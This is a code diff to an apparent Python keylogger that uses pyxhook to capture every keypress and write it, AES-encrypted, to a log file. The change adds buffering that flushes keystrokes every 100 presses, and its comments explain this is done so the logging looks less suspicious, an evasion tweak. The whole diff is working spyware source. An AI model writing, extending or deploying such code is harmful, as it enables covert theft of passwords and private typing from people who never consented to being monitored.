@@ -57,12 +57,28 @@ with open(log_file, 'w') as f:
     f.write(iv)
     log('[*] Wrote AES initialization vector to {}'.format(log_file), verbose)
 
-def OnKeyPress(event):
-    with open(log_file, 'a') as f:
-        f.write(aes_cipher.encrypt('{}\n'.format(event.Key)))
+# we don't want to log to file every keypress, because that would be suspicious
+# so instead we buffer and flush it to file every 100 keypresses
+buff_counter = dict()
+buff_counter['num_keypresses_between_log_updates'] = 100
+buff_counter['buff'] = ''
+buff_counter['keypress_count'] = 0
+
+# some fancy closure to give the hook.KeyDown access to our buff_counter vars
+def getOnKeyPress(buff_counter):
+    def onKeyPress(event):
+        buff_counter['buff'] += '{}\n'.format(event.Key)
+        buff_counter['keypress_count'] = buff_counter['keypress_count'] + 1
+        if buff_counter['keypress_count'] == \
+           buff_counter['num_keypresses_between_log_updates']:    
+            with open(log_file, 'a') as f:
+                f.write(aes_cipher.encrypt(buff_counter['buff']))
+            buff_counter['buff'] = ''
+            buff_counter['keypress_count'] = 0
+    return onKeyPress
 
 hook = pyxhook.HookManager()
-hook.KeyDown = OnKeyPress
+hook.KeyDown = getOnKeyPress(buff_counter)
 hook.HookKeyboard()
 
 try:
